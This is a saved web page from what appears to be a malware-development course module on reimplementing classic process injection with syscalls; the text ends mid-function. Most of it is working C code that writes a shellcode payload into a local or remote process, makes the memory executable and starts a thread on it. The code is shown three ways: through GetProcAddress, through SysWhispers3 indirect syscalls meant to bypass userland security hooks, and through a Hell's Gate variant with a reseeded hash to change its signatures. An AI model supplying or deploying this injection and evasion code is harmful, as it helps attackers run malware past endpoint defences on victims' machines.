<!DOCTYPE html>
<html class="dark"><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta http-equiv="X-UA-Compatible" content="ie-edge">
        <meta name="csrf-token" content="YwmJrjvrFLFoheCqdySsfQHrDWEGzxTLXO7qfost">
        <link rel="stylesheet" href="Syscalls%20-%20Reimplementing%20Classic%20Injection_files/template.css">
        <link rel="shortcut icon" href="https://maldevacademy.com/favicon.ico">
        <!-- fontawesome for icons -->
        <link rel="stylesheet" href="Syscalls%20-%20Reimplementing%20Classic%20Injection_files/font-awesome.min.css">
        <!-- google fonts -->
        <link rel="preconnect" href="https://fonts.gstatic.com/">
        <link href="Syscalls%20-%20Reimplementing%20Classic%20Injection_files/css2.css" rel="stylesheet">
        <link href="Syscalls%20-%20Reimplementing%20Classic%20Injection_files/css2_002.css" rel="stylesheet">
        <title>Syscalls - Reimplementing Classic Injection</title>
        <!-- Custom css files, order matters -->
        <link rel="preload" as="style" href="Syscalls%20-%20Reimplementing%20Classic%20Injection_files/app.fdbb573b.css"><link rel="stylesheet" href="Syscalls%20-%20Reimplementing%20Classic%20Injection_files/app.fdbb573b.css"><link rel="stylesheet" href="Syscalls%20-%20Reimplementing%20Classic%20Injection_files/viewer.css">
    </head>
    <body>
        <nav id="navbar" class="px-2 sm:px-4 py-2.5 bg-gray-900 sticky hidden">
    <div class="container flex flex-wrap justify-between mx-auto">
      <a data-target="_self" href="https://maldevacademy.com/" class="flex items-center">
        <div class="main-logo flex flex-row items-center">
            <span class="text-xl logo-font text-white">MALDEV</span>
            <img class="w-[25px] mx-2 relative bottom-1" src="Syscalls%20-%20Reimplementing%20Classic%20Injection_files/logo-bug-2.png" alt="Logo">   
            <span class="text-xl logo-font text-white">ACADEMY</span>          
        </div>
      </a>
      <button data-collapse-toggle="navbar-default" id="navbar-phone-btn" type="button" class="inline-flex items-center p-2 ml-3 text-sm text-gray-500 rounded-lg md:hidden hover:bg-gray-100 focus:outline-none focus:ring-2 focus:ring-gray-200 dark:text-gray-400 dark:hover:bg-gray-700 dark:focus:ring-gray-600" aria-controls="navbar-default" aria-expanded="false">
        <span class="sr-only">Open main menu</span>
        <svg class="w-6 h-6" aria-hidden="true" fill="currentColor" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" d="M3 5a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1zM3 10a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1zM3 15a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1z" clip-rule="evenodd"></path></svg>
      </button>
      <div class="hidden w-full md:block md:w-auto" id="navbar-default">
        <ul class="flex flex-col items-center p-4 mt-4 bg-gray-50 rounded-lg border border-gray-100 md:flex-row md:space-x-8 md:mt-0 md:text-sm md:font-medium md:border-0 md:bg-white dark:bg-gray-800 md:dark:bg-gray-900 dark:border-gray-700">
          <li>
            <a data-target="_self" href="https://maldevacademy.com/" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">Home</a>
          </li>
          <li>
            <a data-target="_self" href="https://maldevacademy.com/faq" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">FAQ</a>
          </li>
          <li>
            <a data-target="_self" href="https://maldevacademy.com/syllabus" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">Syllabus</a>
          </li>
                              <li>
            <a data-target="_self" href="https://maldevacademy.com/pricing" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">Pricing</a>
          </li>
                                        <li>
            <a data-target="_self" href="https://maldevacademy.com/profile" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">Profile</a>
          </li>
          <li>
            <form action="https://maldevacademy.com/logout" method="POST">
            <input type="hidden" name="_token" value="YwmJrjvrFLFoheCqdySsfQHrDWEGzxTLXO7qfost">              <button type="submit" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">Logout</button>
            </form>
          </li>
          <li class="mt-4 md:mt-0">
            <a data-target="_self" href="https://maldevacademy.com/modules" class="text-white bg-blue-700 hover:bg-blue-800 font-medium rounded-lg text-sm px-5 py-2.5 text-center md:mr-3 mr-0 dark:bg-blue-600 dark:hover:bg-blue-700 dark:focus:ring-blue-800">Modules</a>
          </li>
                  </ul>
      </div>
    </div>
  </nav>        <div class="bg-gray-900 p-4">
    <div class="flex">
        <div class="md:flex-row flex-col flex md:items-center w-1/2 bg-gray-700 border-l border-t border-gray-600 pl-4 pt-2 pb-2 rounded-tl">
            <div>
                Module 67 - Syscalls - Reimplementing Classic Injection
            </div>
            <div class="ml-2 w-4 h-4 bg-orange-600 rounded-full"></div>
        </div>
        <div class="flex justify-end items-center w-1/2 bg-gray-700 pr-4 pt-2 pb-2 rounded-tr border-t border-r border-gray-600">
            <div class="enlarge-container pr-4">
                <img src="Syscalls%20-%20Reimplementing%20Classic%20Injection_files/enlarge.svg" onclick="toggleScreenWidth()" class="hover:bg-gray-600 rounded-sm cursor-pointer" id="enlargeToggle" alt="Screen Width" width="20px">
            </div>
            <div class="objectives-container pr-4">
                <img src="Syscalls%20-%20Reimplementing%20Classic%20Injection_files/objectives.svg" onclick="toggleObjectives()" class="hover:bg-gray-600 cursor-pointer" id="objectivesToggle" alt="Objectives" width="20px">
            </div>
            <div class="terminal-container  pr-4 ">
                <img src="Syscalls%20-%20Reimplementing%20Classic%20Injection_files/ide.svg" onclick="toggleIde()" class="hover:bg-gray-600 rounded-sm cursor-pointer" id="terminalToggle" alt="Terminal" width="22px">
            </div>
                                    <div class="dl-container">
                <a href="https://maldevacademy.com/download/file/SyscallsClassicalInjection" target="_blank">
                    <img src="Syscalls%20-%20Reimplementing%20Classic%20Injection_files/dl.svg" class="hover:bg-gray-600 rounded-full cursor-pointer" alt="Download" width="20px">
                </a>
            </div>
                                </div>
    </div>
    <div id="height-container" class="flex h-full min-h-[800px]">
        <div class="flex max-w-full min-w-full">
            <div id="description-container" class="viewer code-description h-full bg-gray-800 p-4 border-r border-l border-b border-gray-600 px-5 md:px-10 lg:px-20 w-full"><div class="toastui-editor-contents" style="overflow-wrap: break-word;">
            <h2>Syscalls - Reimplementing Classic Injection</h2>
<h3>Introduction</h3>
<p>In this module, the classical process injection technique discussed 
earlier will be implemented using direct syscalls, replacing WinAPIs 
with their syscall equivalent.</p>
<ul>
<li>
<p><code>VirtualAlloc/Ex</code> is replaced with <a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/nf-ntifs-ntallocatevirtualmemory" target="_blank">NtAllocateVirtualMemory</a></p>
</li>
<li>
<p><code>VirtualProtect/Ex</code> is replaced with <a href="http://undocumented.ntinternals.net/UserMode/Undocumented%20Functions/Memory%20Management/Virtual%20Memory/NtProtectVirtualMemory.html" target="_blank">NtProtectVirtualMemory</a></p>
</li>
<li>
<p><code>WriteProcessMemory</code> is replaced with <a href="http://undocumented.ntinternals.net/UserMode/Undocumented%20Functions/Memory%20Management/Virtual%20Memory/NtWriteVirtualMemory.html" target="_blank">NtWriteVirtualMemory</a></p>
</li>
<li>
<p><code>CreateThread/RemoteThread</code> is replaced with <a href="https://github.com/winsiderss/systeminformer/blob/master/phnt/include/ntpsapi.h#L2228" target="_blank">NtCreateThreadEx</a></p>
</li>
</ul>
<h3>Required Syscalls</h3>
<p>This section will go through the required syscalls that will be used and explain their parameters.</p>
<h4>NtAllocateVirtualMemory</h4>
<p>This is the resulting syscall from the <code>VirtualAlloc</code> and <code>VirtualAllocEx</code> WinAPIs. <code>NtAllocateVirtualMemory</code> is shown below.</p>
<pre><code>NTSTATUS NtAllocateVirtualMemory(
  IN HANDLE           ProcessHandle,    // Process handle in where to allocate memory
  IN OUT PVOID        *BaseAddress,     // The returned allocated memory's base address
  IN ULONG_PTR        ZeroBits,         // Always set to '0'
  IN OUT PSIZE_T      RegionSize,       // Size of memory to allocate
  IN ULONG            AllocationType,   // MEM_COMMIT | MEM_RESERVE
  IN ULONG            Protect           // Page protection 
);
</code></pre>
<p><code>NtAllocateVirtualMemory</code> is similar to the <code>VirtualAllocEx</code> WinAPI, however, it differs in that the <code>RegionSize</code> and <code>BaseAddress</code> are both passed by reference, using the address of operator (&amp;). <code>ZeroBits</code>
 is a newly introduced parameter that is defined as the number of 
high-order address bits that must be zero in the base address of the 
section view. This parameter is always set to zero.</p>
<p>The <code>RegionSize</code> parameter is marked as an IN and OUT parameter. This is because the value of <code>RegionSize</code> may change depending on what was actually allocated. Microsoft states that the initial value of <code>RegionSize</code> specifies the size, in bytes, of the region and is rounded up to the next host page size boundary. This means that <code>NtAllocateVirtualMemory</code> rounds up to the nearest multiple of a page size, which is 4096 bytes. For example, if <code>RegionSize</code> is set to 5000 bytes, it will round it up to 8192 and <code>RegionSize</code> will return the value which was allocated, which is 8192 in this example.</p>
<p>As previously mentioned in earlier modules, all the syscalls return <code>NTSTATUS</code>. If successful, it will be set to <code>STATUS_SUCCESS</code> (0). Otherwise, a non-zero value is returned if the syscall <a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/nf-ntifs-ntallocatevirtualmemory#return-value" target="_blank">fails</a>.</p>
<h4>NtProtectVirtualMemory</h4>
<p>This is the resulting syscall from the <code>VirtualProtect</code> and <code>VirtualProtectEx</code> WinAPIs. <code>NtProtectVirtualMemory</code> is shown below.</p>
<pre><code>NTSTATUS NtProtectVirtualMemory(
  IN HANDLE               ProcessHandle,              // Process handle whose memory protection is to be changed
  IN OUT PVOID            *BaseAddress,               // Pointer to the base address to protect
  IN OUT PULONG           NumberOfBytesToProtect,     // Pointer to size of region to protect
  IN ULONG                NewAccessProtection,        // New memory protection to be set
  OUT PULONG              OldAccessProtection         // Pointer to a variable that receives the previous access protection
);
</code></pre>
<p>Both <code>BaseAddress</code> and <code>NumberOfBytesToProtect</code> are passed by reference, using the "address of" operator (&amp;).</p>
<p>The <code>NumberOfBytesToProtect</code> parameter behaves similarly to the <code>RegionSize</code> parameter in <code>NtAllocateVirtualMemory</code> where it rounds up the number of bytes to the nearest multiple of a page.</p>
<h4>NtWriteVirtualMemory</h4>
<p>This is the resulting syscall from the <code>WriteProcessMemory</code> WinAPI. <code>NtWriteVirtualMemory</code> is shown below.</p>
<pre><code>NTSTATUS NtWriteVirtualMemory(
  IN HANDLE               ProcessHandle,          // Process handle whose memory is to be written to          
  IN PVOID                BaseAddress,            // Base address in the specified process to which data is written
  IN PVOID                Buffer,                 // Data to be written
  IN ULONG                NumberOfBytesToWrite,   // Number of bytes to be written
  OUT PULONG              NumberOfBytesWritten    // Pointer to a variable that receives the number of bytes actually written 
);
</code></pre>
<p><code>NtWriteVirtualMemory</code>'s parameters are the same as its WinAPI version, <code>WriteProcessMemory</code>.</p>
<h4>NtCreateThreadEx</h4>
<p>This is the resulting syscall from the <code>CreateThread</code>, <code>CreateRemoteThread</code> and <code>CreateRemoteThreadEx</code> WinAPIs. <code>NtCreateThreadEx</code> is shown below.</p>
<pre><code>NTSTATUS NtCreateThreadEx(
    OUT PHANDLE                 ThreadHandle,         // Pointer to a HANDLE variable that recieves the created thread's handle
    IN 	ACCESS_MASK             DesiredAccess,        // Thread's access rights (set to THREAD_ALL_ACCESS - 0x1FFFFF)  
    IN 	POBJECT_ATTRIBUTES      ObjectAttributes,     // Pointer to OBJECT_ATTRIBUTES structure (set to NULL)
    IN 	HANDLE                  ProcessHandle,        // Handle to the process in which the thread is to be created.
    IN 	PVOID                   StartRoutine,         // Base address of the application-defined function to be executed
    IN 	PVOID                   Argument,             // Pointer to a variable to be passed to the thread function (set to NULL)
    IN 	ULONG                   CreateFlags,          // The flags that control the creation of the thread (set to NULL)
    IN 	SIZE_T                  ZeroBits,             // Set to NULL
    IN 	SIZE_T                  StackSize,            // Set to NULL
    IN 	SIZE_T                  MaximumStackSize,     // Set to NULL
    IN 	PPS_ATTRIBUTE_LIST      AttributeList         // Pointer to PS_ATTRIBUTE_LIST structure (set to NULL)
);
</code></pre>
<p><code>NtCreateThreadEx</code> looks similar to the <code>CreateRemoteThreadEx</code> WinAPI. <code>NtCreateThreadEx</code>
 is a very flexible syscall and can allow complex manipulation of the 
created threads. However, for our purpose, the majority of its 
parameters will be set to <code>NULL</code>.</p>
<h3>Implementation Using GetProcAddress and GetModuleHandle</h3>
<p>Calling the syscalls will be done using several methods, starting with the commonly used <code>GetProcAddress</code> and <code>GetModuleHandle</code>
 WinAPIs. This technique is straightforward and has been used multiple 
times to dynamically call syscalls. As previously discussed, however, 
this method does not bypass any userland hooks installed on the 
syscalls.</p>
<p>In the code provided for download in this module, a <code>Syscall</code> structure is created and initialized using <code>InitializeSyscallStruct</code>, which holds the addresses of the syscalls used, as shown below.</p>
<pre><code>// A structure that keeps the syscalls used
typedef struct _Syscall {

	fnNtAllocateVirtualMemory pNtAllocateVirtualMemory;
	fnNtProtectVirtualMemory  pNtProtectVirtualMemory;
	fnNtWriteVirtualMemory    pNtWriteVirtualMemory;
	fnNtCreateThreadEx        pNtCreateThreadEx;

} Syscall, *PSyscall;


// Function used to populate the input 'St' structure
BOOL InitializeSyscallStruct (OUT PSyscall St) {

	HMODULE hNtdll = GetModuleHandle(L"NTDLL.DLL");
	if (!hNtdll) {
		printf("[!] GetModuleHandle Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	St-&gt;pNtAllocateVirtualMemory  = (fnNtAllocateVirtualMemory)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
	St-&gt;pNtProtectVirtualMemory   = (fnNtProtectVirtualMemory)GetProcAddress(hNtdll, "NtProtectVirtualMemory");
	St-&gt;pNtWriteVirtualMemory     = (fnNtWriteVirtualMemory)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
	St-&gt;pNtCreateThreadEx         = (fnNtCreateThreadEx)GetProcAddress(hNtdll, "NtCreateThreadEx");

        // check if GetProcAddress missed a syscall 
	if (St-&gt;pNtAllocateVirtualMemory == NULL || St-&gt;pNtProtectVirtualMemory == NULL || St-&gt;pNtWriteVirtualMemory == NULL || St-&gt;pNtCreateThreadEx == NULL)
		return FALSE;
	else
		return TRUE;
}
</code></pre>
<p>Next, the <code>ClassicInjectionViaSyscalls</code> function will be responsible for executing the payload, <code>pPayload</code>, in the target process, <code>hProcess</code>. The function returns <code>FALSE</code> if it fails to execute the payload and <code>TRUE</code> if it succeeds. Additionally, the function can be used to inject both local and remote processes depending on the value of <code>hProcess</code>.</p>
<pre><code>BOOL ClassicInjectionViaSyscalls(IN HANDLE hProcess, IN PVOID pPayload, IN SIZE_T sPayloadSize) {


	Syscall   St                     = { 0 };
	NTSTATUS  STATUS                 = 0x00;
	PVOID     pAddress               = NULL;
	ULONG     uOldProtection         = NULL;

	SIZE_T    sSize                  = sPayloadSize,
              sNumberOfBytesWritten	= NULL;
	HANDLE    hThread                = NULL;

	// Initializing the 'St' structure to fetch the syscall's addresses
	if (!InitializeSyscallStruct(&amp;St)){
		printf("[!] Could Not Initialize The Syscall Struct \n");
		return FALSE;
	}
	
//--------------------------------------------------------------------------
	
	// Allocating memory 
	if ((STATUS = St.pNtAllocateVirtualMemory(hProcess, &amp;pAddress, 0, &amp;sSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)) != 0) {
		printf("[!] NtAllocateVirtualMemory Failed With Error : 0x%0.8X \n", STATUS);
		return FALSE;
	}

	printf("[+] Allocated Address At : 0x%p Of Size : %d \n", pAddress, sSize);
	printf("[#] Press &lt;Enter&gt; To Write The Payload ... ");
	getchar();

//--------------------------------------------------------------------------

	// Writing the payload
	printf("\t[i] Writing Payload Of Size %d ... ", sPayloadSize);
	if ((STATUS = St.pNtWriteVirtualMemory(hProcess, pAddress, pPayload, sPayloadSize, &amp;sNumberOfBytesWritten)) != 0 || sNumberOfBytesWritten != sPayloadSize) {
		printf("[!] pNtWriteVirtualMemory Failed With Error : 0x%0.8X \n", STATUS);
		printf("[i] Bytes Written : %d of %d \n", sNumberOfBytesWritten, sPayloadSize);
		return FALSE;
	}
	printf("[+] DONE \n");

//--------------------------------------------------------------------------

	// Changing the memory's permissions to RWX
	if ((STATUS = St.pNtProtectVirtualMemory(hProcess, &amp;pAddress, &amp;sPayloadSize, PAGE_EXECUTE_READWRITE, &amp;uOldProtection)) != 0) {
		printf("[!] NtProtectVirtualMemory Failed With Error : 0x%0.8X \n", STATUS);
		return FALSE;
	}

//--------------------------------------------------------------------------
	// Executing the payload via thread 
	printf("[#] Press &lt;Enter&gt; To Run The Payload ... ");
	getchar();
	printf("\t[i] Running Thread Of Entry 0x%p ... ", pAddress);
	if ((STATUS = St.pNtCreateThreadEx(&amp;hThread, THREAD_ALL_ACCESS, NULL, hProcess, pAddress, NULL, NULL, NULL, NULL, NULL, NULL)) != 0) {
		printf("[!] NtCreateThreadEx Failed With Error : 0x%0.8X \n", STATUS);
		return FALSE;
	}
	
	printf("[+] DONE \n");
	printf("\t[+] Thread Created With Id : %d \n", GetThreadId(hThread));

	return TRUE;
}

</code></pre>
<h4>Payload Size &amp; Rounding Up</h4>
<p>Recall that <code>NtAllocateVirtualMemory</code> rounds up the value of <code>RegionSize</code>
 to be a multiple of 4096. Due to the rounding up of the size, one must 
be careful when using the same payload size variable when allocating 
memory and writing to memory as it can lead to more bytes being written 
than what was intended. This is why the code above uses separate size 
variables for <code>NtAllocateVirtualMemory</code> and <code>NtWriteVirtualMemory</code>.</p>
<p>The issue is demonstrated in the code snippet below.</p>
<pre><code>  // sPayloadSize is the payload's size (272 bytes)
  // Allocating memory 
  if ((STATUS = St.pNtAllocateVirtualMemory(hProcess, &amp;pAddress, 0, &amp;sPayloadSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)) != 0) {
    return FALSE;
  }

  // sPayloadSize's value is now 4096
  // Writing the payload with sPayloadSize (NumberOfBytesToWrite) as 4096 instead of the original size
  if ((STATUS = St.pNtWriteVirtualMemory(hProcess, pAddress, pPayload, sPayloadSize, &amp;sNumberOfBytesWritten)) != 0) {
    return FALSE;
  } 
</code></pre>
<h3>Implementation Using SysWhispers</h3>
<p>The implementation here uses SysWhispers3 to bypass userland hooks 
via indirect syscalls. The following command is used to generate the 
required files for this implementation.</p>
<pre><code>python syswhispers.py -a x64 -c msvc -m jumper_randomized -f NtAllocateVirtualMemory,NtProtectVirtualMemory,NtWriteVirtualMemory,NtCreateThreadEx -o SysWhispers -v
</code></pre>
<p>Three files are generated: <code>SysWhispers.h</code>, <code>SysWhispers.c</code> and <code>SysWhispers-asm.x64.asm</code>. The next step is to import these files into Visual Studio as noted in the <a href="https://github.com/klezVirus/SysWhispers3#importing-into-visual-studio" target="_blank">SysWhisper's Readme here</a>. The steps are demonstrated below.</p>
<h4>Step 1</h4>
<p>Copy the generated files to the project folder and then add them to the Visual Studio project as existing items.</p>
<p><img src="Syscalls%20-%20Reimplementing%20Classic%20Injection_files/syscalls-classic-114349632-de44115a-3e9f-450f-bb37-f0bff7776.png" alt="image"></p>
<h4>Step 2</h4>
<p>Enable MASM in the project to allow for the compilation of the generated assembly code.</p>
<p><img src="Syscalls%20-%20Reimplementing%20Classic%20Injection_files/syscalls-classic-214351708-4ba6253b-4713-4fed-8711-e8cb07669.png" alt="image"></p>
<p><img src="Syscalls%20-%20Reimplementing%20Classic%20Injection_files/syscalls-classic-314352187-6786f4d7-1ae2-4e6b-94ce-8f8087d22.png" alt="image"></p>
<h4>Step 3</h4>
<p>Modify the properties to set the ASM file to be compiled using <em>Microsoft Macro Assembler</em>.</p>
<p><img src="Syscalls%20-%20Reimplementing%20Classic%20Injection_files/syscalls-classic-414353258-3fbf4ead-ce9c-4083-805a-ae5ced082.png" alt="image"></p>
<p><img src="Syscalls%20-%20Reimplementing%20Classic%20Injection_files/syscalls-classic-514353606-1e3d5862-fc03-4247-b03e-493b07f3a.png" alt="image"></p>
<h4>Step 4</h4>
<p>The Visual Studio project can now be compiled. The <code>ClassicInjectionViaSyscalls</code> function is shown below.</p>
<pre><code>
BOOL ClassicInjectionViaSyscalls(IN HANDLE hProcess, IN PVOID pPayload, IN SIZE_T sPayloadSize) {


	NTSTATUS	STATUS                  = 0x00;
	PVOID		pAddress                = NULL;
	ULONG		uOldProtection          = NULL;

	SIZE_T		sSize                   = sPayloadSize,
			    sNumberOfBytesWritten   = NULL;
	HANDLE		hThread	                = NULL;



	// Allocating memory 
	if ((STATUS = NtAllocateVirtualMemory(hProcess, &amp;pAddress, 0, &amp;sSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)) != 0) {
		printf("[!] NtAllocateVirtualMemory Failed With Error : 0x%0.8X \n", STATUS);
		return FALSE;
	}
	printf("[+] Allocated Address At : 0x%p Of Size : %d \n", pAddress, sSize);
	printf("[#] Press &lt;Enter&gt; To Write The Payload ... ");
	getchar();

//--------------------------------------------------------------------------
	// Writing the payload
	printf("\t[i] Writing Payload Of Size %d ... ", sPayloadSize);
	if ((STATUS = NtWriteVirtualMemory(hProcess, pAddress, pPayload, sPayloadSize, &amp;sNumberOfBytesWritten)) != 0 || sNumberOfBytesWritten != sPayloadSize) {
		printf("[!] pNtWriteVirtualMemory Failed With Error : 0x%0.8X \n", STATUS);
		printf("[i] Bytes Written : %d of %d \n", sNumberOfBytesWritten, sPayloadSize);
		return FALSE;
	}
	printf("[+] DONE \n");

//--------------------------------------------------------------------------
	// Changing the memory's permissions to RWX
	if ((STATUS = NtProtectVirtualMemory(hProcess, &amp;pAddress, &amp;sPayloadSize, PAGE_EXECUTE_READWRITE, &amp;uOldProtection)) != 0) {
		printf("[!] NtProtectVirtualMemory Failed With Error : 0x%0.8X \n", STATUS);
		return FALSE;
	}

//--------------------------------------------------------------------------
	// Executing the payload via thread 
	printf("[#] Press &lt;Enter&gt; To Run The Payload ... ");
	getchar();
	printf("\t[i] Running Thread Of Entry 0x%p ... ", pAddress);
	if ((STATUS = NtCreateThreadEx(&amp;hThread, THREAD_ALL_ACCESS, NULL, hProcess, pAddress, NULL, NULL, NULL, NULL, NULL, NULL)) != 0) {
		printf("[!] NtCreateThreadEx Failed With Error : 0x%0.8X \n", STATUS);
		return FALSE;
	}
	printf("[+] DONE \n");
	printf("\t[+] Thread Created With Id : %d \n", GetThreadId(hThread));

	return TRUE;
}
</code></pre>
<h3>Implementation Using Hell's Gate</h3>
<p>The last implementation for this module is using Hell's Gate. First, 
ensure that the same steps done to set up the Visual Studio project with
 SysWhispers3 are done here too. Specifically, enabling MASM and 
modifying the properties to set the ASM file to be compiled using the 
Microsoft Macro Assembler.</p>
<h4>Changing Payload Function</h4>
<p>A few changes need to be made to the Hell's Gate code. First, the <a href="https://github.com/am0nsec/HellsGate/blob/master/HellsGate/main.c#L166" target="_blank">Payload function</a> must be replaced with the <code>ClassicInjectionViaSyscalls</code> function.</p>
<pre><code>BOOL ClassicInjectionViaSyscalls(IN PVX_TABLE pVxTable, IN HANDLE hProcess, IN PBYTE pPayload, IN SIZE_T sPayloadSize) {

	NTSTATUS	STATUS                  = 0x00;
	PVOID		pAddress                = NULL;
	ULONG		uOldProtection          = NULL;

	SIZE_T		sSize                   = sPayloadSize,
			    sNumberOfBytesWritten   = NULL;
	HANDLE		hThread	                = NULL;


	// Allocating memory 
	HellsGate(pVxTable-&gt;NtAllocateVirtualMemory.wSystemCall);
	if ((STATUS = HellDescent(hProcess, &amp;pAddress, 0, &amp;sSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)) != 0) {
		printf("[!] NtAllocateVirtualMemory Failed With Error : 0x%0.8X \n", STATUS);
		return FALSE;
	}

	printf("[+] Allocated Address At : 0x%p Of Size : %d \n", pAddress, sSize);
	printf("[#] Press &lt;Enter&gt; To Write The Payload ... ");
	getchar();

//--------------------------------------------------------------------------

	// Writing the payload
	printf("\t[i] Writing Payload Of Size %d ... ", sPayloadSize);
	HellsGate(pVxTable-&gt;NtWriteVirtualMemory.wSystemCall);
	if ((STATUS = HellDescent(hProcess, pAddress, pPayload, sPayloadSize, &amp;sNumberOfBytesWritten)) != 0 || sNumberOfBytesWritten != sPayloadSize) {
		printf("[!] pNtWriteVirtualMemory Failed With Error : 0x%0.8X \n", STATUS);
		printf("[i] Bytes Written : %d of %d \n", sNumberOfBytesWritten, sPayloadSize);
		return FALSE;
	}
	printf("[+] DONE \n");

//--------------------------------------------------------------------------

	// Changing the memory's permissions to RWX
	HellsGate(pVxTable-&gt;NtProtectVirtualMemory.wSystemCall);
	if ((STATUS = HellDescent(hProcess, &amp;pAddress, &amp;sPayloadSize, PAGE_EXECUTE_READWRITE, &amp;uOldProtection)) != 0) {
		printf("[!] NtProtectVirtualMemory Failed With Error : 0x%0.8X \n", STATUS);
		return FALSE;
	}

//--------------------------------------------------------------------------
	// Executing the payload via thread 
	printf("[#] Press &lt;Enter&gt; To Run The Payload ... ");
	getchar();
	printf("\t[i] Running Thread Of Entry 0x%p ... ", pAddress);
	HellsGate(pVxTable-&gt;NtCreateThreadEx.wSystemCall);
	if ((STATUS = HellDescent(&amp;hThread, THREAD_ALL_ACCESS, NULL, hProcess, pAddress, NULL, NULL, NULL, NULL, NULL, NULL)) != 0) {
		printf("[!] NtCreateThreadEx Failed With Error : 0x%0.8X \n", STATUS);
		return FALSE;
	}
	printf("[+] DONE \n");
	printf("\t[+] Thread Created With Id : %d \n", GetThreadId(hThread));


	return TRUE;
}
</code></pre>
<h4>Updating The VX_TABLE Structure</h4>
<p>Next, the <a href="https://github.com/am0nsec/HellsGate/blob/master/HellsGate/main.c#L14" target="_blank">VX_TABLE</a> structure must be updated with the names of the syscalls that are used in this module, as shown below.</p>
<pre><code>typedef struct _VX_TABLE {
	VX_TABLE_ENTRY NtAllocateVirtualMemory;
	VX_TABLE_ENTRY NtWriteVirtualMemory;
	VX_TABLE_ENTRY NtProtectVirtualMemory;
	VX_TABLE_ENTRY NtCreateThreadEx;
} VX_TABLE, * PVX_TABLE;
</code></pre>
<h4>Updating Seed Value</h4>
<p>A new seed value will be used to replace the <a href="https://github.com/am0nsec/HellsGate/blob/master/HellsGate/main.c#L93" target="_blank">old one</a> to change the hash values of the syscalls. The djb2 hashing function is updated with the new seed value below.</p>
<pre><code>DWORD64 djb2(PBYTE str) {
	DWORD64 dwHash = 0x77347734DEADBEEF; // Old value: 0x7734773477347734
	INT c;

	while (c = *str++)
		dwHash = ((dwHash &lt;&lt; 0x5) + dwHash) + c;

	return dwHash;
}
</code></pre>
<p>The following <code>printf</code> statements should be added to a new project to generate the djb2 hash values.</p>
<pre><code>printf("#define %s%s 0x%p \n", "NtAllocateVirtualMemory", "_djb2", (DWORD64)djb2("NtAllocateVirtualMemory"));
printf("#define %s%s 0x%p \n", "NtWriteVirtualMemory", "_djb2", djb2("NtWriteVirtualMemory"));
printf("#define %s%s 0x%p \n", "NtProtectVirtualMemory", "_djb2", djb2("NtProtectVirtualMemory"));
printf("#define %s%s 0x%p \n", "NtCreateThreadEx", "_djb2", djb2("NtCreateThreadEx"));
</code></pre>
<p><img src="Syscalls%20-%20Reimplementing%20Classic%20Injection_files/syscalls-classic-618293274-8d259f06-efa2-4254-886c-ce14500fb.png" alt="image"></p>
<p>Once the values are generated, add them to the start of the Hell's Gate project.</p>
<pre><code>#define NtAllocateVirtualMemory_djb2  0x7B2D1D431C81F5F6
#define NtWriteVirtualMemory_djb2     0x54AEE238645CCA7C
#define NtProtectVirtualMemory_djb2   0xA0DCC2851566E832
#define NtCreateThreadEx_djb2         0x2786FB7E75145F1A
</code></pre>
<h4>Updating The Main Function</h4>
<p>The main function must be updated to call the <code>ClassicInjectionViaSyscalls</code> instead of the <a href="https://github.com/am0nsec/HellsGate/blob/master/HellsGate/main.c#L80" target="_blank">payload function</a>. The function will use the above-generated hashes as shown below.</p>
<pre><code>INT main() {
	// Getting the PEB structure
	PTEB pCurrentTeb = RtlGetThreadEnvironmentBlock();
	PPEB pCurrentPeb = pCurrentTeb-&gt;ProcessEnvironmentBlock;
	if (!pCurrentPeb || !pCurrentTeb || pCurrentPeb-&gt;OSMajorVersion != 0xA)
		return 0x1;

	// Getting the NTDLL module 
	PLDR_DATA_TABLE_ENTRY pLdrDataEntry = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pCurrentPeb-&gt;LoaderData-&gt;InMemoryOrderModuleList.Flink-&gt;Flink - 0x10);

	// Getting the EAT of Ntdll
	PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = NULL;
	if (!GetImageExportDirectory(pLdrDataEntry-&gt;DllBase, &amp;pImageExportDirectory) || pImageExportDirectory == NULL)
		return 0x01;

//--------------------------------------------------------------------------
	// Initializing the 'Table' structure
	VX_TABLE Table = { 0 };
	Table.NtAllocateVirtualMemory.dwHash = NtAllocateVirtualMemory_djb2;
	if (!GetVxTableEntry(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, &amp;Table.NtAllocateVirtualMemory))
		return 0x1;

	Table.NtWriteVirtualMemory.dwHash = NtWriteVirtualMemory_djb2;
	if (!GetVxTableEntry(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, &amp;Table.NtWriteVirtualMemory))
		return 0x1;

	Table.NtProtectVirtualMemory.dwHash = NtProtectVirtualMemory_djb2;
	if (!GetVxTableEntry(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, &amp;Table.NtProtectVirtualMemory))
		return 0x1;
	
	Table.NtCreateThreadEx.dwHash = NtCreateThreadEx_djb2;
	if (!GetVxTableEntry(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, &amp;Table.NtCreateThreadEx))
		return 0x1;

//--------------------------------------------------------------------------
	// injection code - calling the 'ClassicInjectionViaSyscalls' function


// If local injection 
#ifdef LOCAL_INJECTION
	if (!ClassicInjectionViaSyscalls(&amp;Table, (HANDLE)-1, Payload, sizeof(Payload)))
